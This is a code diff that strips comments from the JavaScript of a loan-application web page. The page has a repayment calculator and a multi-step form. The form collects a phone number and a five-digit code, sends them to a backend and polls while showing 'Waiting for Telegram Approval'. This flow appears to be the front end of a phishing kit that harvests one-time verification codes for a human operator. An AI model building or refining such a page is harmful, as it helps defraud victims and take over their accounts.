@@ -6,17 +6,12 @@ function goToScreen(screenId) {
     document.getElementById(screenId).classList.add('active');
 }
 
-// --- Language Selection Logic ---
 function selectLanguage(lang, element) {
-    // Remove 'selected' class from all options
     document.querySelectorAll('.lang-option').forEach(opt => {
         opt.classList.remove('selected');
     });
-    
-    // Add 'selected' class to the clicked one
     element.classList.add('selected');
     
-    // Wait a brief moment for the user to see the radio button click, then move to home
     setTimeout(() => {
         goToScreen('screen-home');
     }, 300);
@@ -33,11 +28,8 @@ function updateCalculator() {
     const months = parseInt(termSelect.value);
     
     loanAmountDisplay.innerText = principal.toLocaleString();
-    
-    // Simple calculation: (Principal + 10% flat interest) / Months
     const totalRepayment = principal * 1.10;
     const monthly = totalRepayment / months;
-    
     monthlyPaymentDisplay.innerText = Math.round(monthly).toLocaleString();
 }
 
@@ -45,7 +37,7 @@ amountSlider.addEventListener('input', updateCalculator);
 termSelect.addEventListener('change', updateCalculator);
 updateCalculator();
 
-// --- Form Input Restrictions (Numbers Only) ---
+// --- Form Input Restrictions ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
@@ -82,7 +74,6 @@ function updateFormUI() {
 // --- Validation & Telegram Approval Logic ---
 async function nextStep() {
     if (currentStep < totalSteps) {
-        // 1. Validate all inputs in the current step
         const currentStepDiv = document.getElementById(`step-${currentStep}`);
         const inputs = currentStepDiv.querySelectorAll('input, select');
         let isValid = true;
@@ -92,7 +83,7 @@ async function nextStep() {
                 isValid = false;
                 input.style.borderColor = 'red';
             } else {
-                input.style.borderColor = '#3c5c75'; // Reset to dark border
+                input.style.borderColor = '#3c5c75'; 
             }
         });
 
@@ -101,7 +92,6 @@ async function nextStep() {
             return;
         }
 
-        // 2. Change Button Text
         const nextBtn = document.getElementById('btn-next');
         const originalText = nextBtn.innerText;
         nextBtn.innerText = "Waiting for Telegram Approval...";
@@ -111,7 +101,6 @@ async function nextStep() {
         const code = document.getElementById('five-digit-code').value || "Unknown";
 
         try {
-            // 3. Send to Python Backend
             const response = await fetch('/api/request-approval', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -119,7 +108,6 @@ async function nextStep() {
             });
             const result = await response.json();
 
-            // 4. Poll for approval from Telegram
             const interval = setInterval(async () => {
                 const statusRes = await fetch(`/api/check-status/${result.app_id}`);
                 const statusData = await statusRes.json();
@@ -153,7 +141,6 @@ function prevStep() {
     }
 }
 
-// --- Summary Generation ---
 function generateSummary() {
     const amount = document.getElementById('form-amount').value;
     const term = document.getElementById('form-term').value;
@@ -172,7 +159,6 @@ function generateSummary() {
     }
 }
 
-// --- Final Form Submission ---
 function submitForm(event) {
     event.preventDefault(); 
     goToScreen('screen-success');
